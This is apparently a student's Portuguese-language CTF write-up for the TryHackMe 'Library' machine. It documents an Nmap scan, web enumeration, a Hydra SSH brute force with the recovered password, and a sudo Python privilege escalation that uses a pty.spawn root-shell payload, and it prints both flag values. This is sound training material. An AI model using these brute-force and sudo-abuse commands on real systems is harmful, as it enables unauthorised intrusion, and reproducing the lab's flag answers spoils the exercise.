# 🔍 Library — CTF Writeup
### TryHackMe | Boot-to-Root | Reconhecimento · Força Bruta SSH · Escalada de Privilégios via sudo Python

---

| **Analista**          | Mauricio Robert                                                                        |
|-----------------------|----------------------------------------------------------------------------------------|
| **Organização**       | Faculdade Impacta                                                                      |
| **Data do Relatório** | 23/06/2026                                                                             |
| **Data do Pentest**   | 23/06/2026 · 21:49 – 22:10 (GMT-3)                                                    |
| **Alvo**              | `10.66.129.154` — TryHackMe · Library                                                  |
| **Classificação**     | CONFIDENCIAL                                                                           |
| **Ferramentas**       | Nmap 7.99 · Gobuster 3.8.2 · Hydra 9.7 · OpenSSH · Python3 (pty)                     |
| **Plataforma**        | TryHackMe — Boot-to-Root                                                               |

---

## 🔍 Resumo Executivo

Este relatório documenta o comprometimento completo da máquina **Library** (TryHackMe) em aproximadamente **19 minutos**, por meio de uma cadeia de ataque encadeando reconhecimento de rede, enumeração web, descoberta de username no código-fonte de blog, ataque de força bruta SSH e escalada de privilégios via permissão sudo mal configurada para execução de script Python. Nenhuma vulnerabilidade CVE foi necessária — o comprometimento total dependeu exclusivamente de **falhas de configuração e práticas inadequadas de hardening**. As flags `user.txt` e `root.txt` foram capturadas com sucesso, confirmando o comprometimento total (root) do sistema Ubuntu 16.04.6 LTS.

---

## 🛠 Ferramentas Utilizadas

| Ferramenta          | Versão  | Finalidade                                                                         |
|---------------------|---------|------------------------------------------------------------------------------------|
| **Nmap**            | 7.99    | Varredura de portas e fingerprinting de serviços (`-sV -sC`, 1000 portos TCP)     |
| **Gobuster**        | 3.8.2   | Enumeração de diretórios e arquivos web (wordlist `common.txt`, extensões php/txt) |
| **Hydra**           | 9.7     | Força bruta SSH com wordlist `rockyou.txt` (`-l meliodas -t 64`)                  |
| **OpenSSH**         | client  | Acesso remoto à máquina alvo como usuário `meliodas`                               |
| **Python3**         | sistema | Escalada de privilégios via `pty.spawn` — substituição de `bak.py`                |

---

## 📋 Fases de Comprometimento

### FASE 1 — Reconhecimento: Varredura Nmap

> **21:49 GMT-3 · Nmap 7.99 · Alvo: 10.66.129.154**

**Solução:** Varredura agressiva com detecção de serviços e scripts padrão (`-sV -sC`) sobre os 1000 portos TCP mais comuns. O Nmap identificou **dois serviços ativos**:

```
22/tcp  open  ssh   OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http  Apache httpd 2.4.18
         http-title: Welcome to Blog - Library Machine
         http-robots.txt: 1 disallowed entry
```

Informações adicionais relevantes do scan:

```
OS: Linux 3.8–3.16 (96% confiança)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
Uptime: 0 days (since Tue Jun 23 21:46:17 2026)
Network Distance: 3 hops
```

O script `http-robots.txt` sinalizou **1 entrada disallow**, indicando a existência do arquivo `robots.txt` — que se revelaria a chave para a próxima fase do ataque.

![Nmap](/CTFs/Library/images/Nmap_Result.png)

---

### FASE 2 — Enumeração Web: robots.txt + Código-Fonte + Gobuster

> **~21:55 GMT-3 · Browser + Gobuster 3.8.2**

#### robots.txt — Pista da Wordlist

O arquivo `http://10.66.129.154/robots.txt` revelou:

```
User-agent: rockyou
Disallow: /
```

A diretiva `User-agent` contendo o nome **`rockyou`** foi interpretada como dica intencional do desafio, sinalizando o uso da wordlist `/usr/share/wordlists/rockyou.txt` no ataque de força bruta subsequente — pista que se confirmou fundamental.

![robots.txt](/CTFs/Library/images/robots.txt.png)

#### Código-Fonte do Blog — Descoberta de Username

A análise do código-fonte da página inicial (`view-source:http://10.66.129.154/#comments`) revelou o username **`meliodas`** exposto no HTML do blog como autor das postagens:

```html
<p>Posted on <time datetime="2009-06-29T23:31+01:00">June 29th 2009</time>
   by <a href="#">meliodas</a> - <a href="#comments">3 comments</a></p>
```

O comentário do usuário **`root`** às 23:35 também foi identificado, confirmando a existência de um usuário privilegiado no sistema. O username `meliodas` seria o alvo direto do ataque de força bruta SSH.

![Meliodas](/CTFs/Library/images/meliodas_user.png)

#### Gobuster — Enumeração de Diretórios

Varredura com Gobuster v3.8.2 (`-w common.txt -t 100 -x php,txt`) sobre `http://10.66.129.154/` retornou:

```
.htpasswd      (Status: 403) [Size: 297]
.htaccess      (Status: 403) [Size: 297]
index.html     (Status: 200) [Size: 5439]
robots.txt     (Status: 200) [Size: 33]
/images        (Status: 301) [Size: 315] → http://10.66.129.154/images
server-status  (Status: 403) [Size: 301]
```

Nenhum painel administrativo ou recurso adicional sensível foi identificado. O Apache protegeu corretamente os arquivos `.htpasswd`/`.htaccess` com status 403.

![Gobuster](/CTFs/Library/images/Gobuster_Result.png)

---

### FASE 3 — Força Bruta SSH: Hydra

> **22:04 GMT-3 · Hydra 9.7**

**Comando final:**
```bash
hydra -l meliodas -P /usr/share/wordlists/rockyou.txt ssh://10.66.129.154 -t 64
```

Após dois ajustes no parâmetro de threads (redução de 1000 → 64 para respeitar os limites de paralelismo do OpenSSH), o Hydra v9.7 iniciou o ataque com **14.344.398 tentativas** (1 usuário × wordlist completa). A credencial válida foi encontrada em aproximadamente **1 minuto**:

```
[22][ssh] host: 10.66.129.154   login: meliodas   password: iloveyou1
1 of 1 target successfully completed, 1 valid password found
Hydra finished at 2026-06-23 22:05:23
```

A senha `iloveyou1` estava presente no `rockyou.txt`, exatamente como indicado pelo `robots.txt` — confirmando a intencionalidade da dica do desafio.

![Hydra](/CTFs/Library/images/Hydra_SSH.png)

---

### FASE 4 — Acesso Inicial: SSH + Captura de user.txt

> **22:05 GMT-3 · ssh meliodas@10.66.129.154**

Com as credenciais obtidas, o login SSH foi estabelecido com sucesso:

```
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-159-generic x86_64)
Last login: Sat Aug 24 14:51:01 2019 from 192.168.15.118

meliodas@ubuntu:~$ ls
bak.py  user.txt

meliodas@ubuntu:~$ cat user.txt
6d488cbb3f111d135722c33cb635f4ec
```

O diretório home listou dois arquivos: `user.txt` (flag de usuário) e `bak.py` (script Python — vetor da escalada de privilégios na próxima fase).

> 🚩 **user.txt — FLAG CAPTURADA: `6d488cbb3f111d135722c33cb635f4ec`**

![Acesso e User.txt](/CTFs/Library/images/First_Flag_user.txt.png)

---

### FASE 5 — Escalada de Privilégios: sudo Python3 + Captura de root.txt

> **22:08 GMT-3 · sudo + Python3 pty**

**Vetor:** `sudo NOPASSWD` — `/usr/bin/python* /home/meliodas/bak.py`

O comando `sudo -l` revelou a configuração insegura de sudo:

```
User meliodas may run the following commands on ubuntu:
    (ALL) NOPASSWD: /usr/bin/python* /home/meliodas/bak.py
```

Como `meliodas` tem **permissão de escrita no próprio diretório home**, a estratégia foi substituir o conteúdo de `bak.py` por um payload de escalada usando a biblioteca `pty` do Python:

```bash
# 1. Remove o script original
meliodas@ubuntu:~$ rm -rf bak.py

# 2. Cria payload de shell interativo como root
meliodas@ubuntu:~$ echo 'import pty; pty.spawn("/bin/bash")' > bak.py

# 3. Executa com privilégios root via sudo
meliodas@ubuntu:~$ sudo /usr/bin/python3 /home/meliodas/bak.py

# Shell root obtido imediatamente
root@ubuntu:~# cat /root/root.txt
e8c8c6c256c35515d1d344ee0488c617
```

> 🚩 **root.txt — FLAG CAPTURADA: `e8c8c6c256c35515d1d344ee0488c617`**

![root](/CTFs/Library/images/Escalation_Privilege_and_FlagRoot)

---

## ⛓ Linha do Tempo do Comprometimento

```
[21:49 GMT-3] FASE 1 — RECONHECIMENTO (Nmap 7.99)
    Scan agressivo -sV -sC sobre 10.66.129.154
    Portas abertas: 22/TCP (OpenSSH 7.2p2) · 80/TCP (Apache 2.4.18)
    OS: Ubuntu 16.04 · Kernel 4.4.0-159 · robots.txt: 1 disallow
    ↓
[21:55 GMT-3] FASE 2 — ENUMERAÇÃO WEB
    robots.txt → User-agent: rockyou → dica da wordlist para força bruta
    view-source HTML → username "meliodas" exposto como autor do blog
    Gobuster: index.html (200), robots.txt (200), /images (301)
    Nenhum painel admin encontrado
    ↓
[22:04 GMT-3] FASE 3 — FORÇA BRUTA SSH (Hydra 9.7)
    hydra -l meliodas -P rockyou.txt ssh://10.66.129.154 -t 64
    14.344.398 tentativas · ~1 minuto de execução
    CREDENCIAL ENCONTRADA: meliodas:iloveyou1
    ↓
[22:05 GMT-3] FASE 4 — ACESSO INICIAL (SSH)
    ssh meliodas@10.66.129.154 · Ubuntu 16.04.6 LTS x86_64
    Diretório home: bak.py + user.txt
    FLAG user.txt: 6d488cbb3f111d135722c33cb635f4ec ✓
    ↓
[22:08 GMT-3] FASE 5 — ESCALADA DE PRIVILÉGIOS (sudo Python3)
    sudo -l → (ALL) NOPASSWD: /usr/bin/python* /home/meliodas/bak.py
    rm -rf bak.py → echo 'import pty; pty.spawn("/bin/bash")' > bak.py
    sudo /usr/bin/python3 /home/meliodas/bak.py → root shell
    FLAG root.txt: e8c8c6c256c35515d1d344ee0488c617 ✓
    ↓
[22:08 GMT-3] COMPROMETIMENTO TOTAL — root@ubuntu
    Duração total: ~19 minutos
```

---

## 🗺 Mapeamento Investigativo

| Fase | Ferramenta/Técnica | Achado |
|------|--------------------|--------|
| Reconhecimento | Nmap 7.99 (`-sV -sC`) | Portas 22 (SSH) e 80 (HTTP) abertas; `robots.txt` sinalizado |
| Enumeração Web | Browser (robots.txt) | `User-agent: rockyou` → dica de wordlist para força bruta |
| Enumeração Web | Browser (view-source) | Username `meliodas` exposto no HTML do blog como autor |
| Enumeração Web | Gobuster 3.8.2 | `index.html`, `robots.txt`, `/images` — sem painéis admin |
| Força Bruta SSH | Hydra 9.7 (`-t 64`) | Credencial SSH: `meliodas:iloveyou1` (rockyou.txt) |
| Acesso Inicial | OpenSSH | Login como `meliodas`; `user.txt` capturado |
| Escalada de Privilégio | sudo + Python3 pty | `sudo NOPASSWD bak.py` + substituição → root shell; `root.txt` capturado |

---


## ✅ Resumo das Flags

| # | Flag | Valor |
|---|------|-------|
| 🚩 user.txt | `/home/meliodas/user.txt` | `6d488cbb3f111d135722c33cb635f4ec` |
| 🚩 root.txt | `/root/root.txt` | `e8c8c6c256c35515d1d344ee0488c617` |

---

## 📚 Referências

- [TryHackMe — Library](https://tryhackme.com/room/bsidesgtlibrary)
- [Nmap Reference Guide](https://nmap.org/book/man.html)
- [Gobuster — OJ Reeves](https://github.com/OJ/gobuster)
- [THC-Hydra — Van Hauser](https://github.com/vanhauser-thc/thc-hydra)
- [GTFOBins — sudo Python](https://gtfobins.github.io/gtfobins/python/)
- [MITRE ATT&CK T1110.001 — Brute Force: Password Guessing](https://attack.mitre.org/techniques/T1110/001/)
- [MITRE ATT&CK T1548.003 — Abuse Elevation Control: Sudo and Sudo Caching](https://attack.mitre.org/techniques/T1548/003/)

---
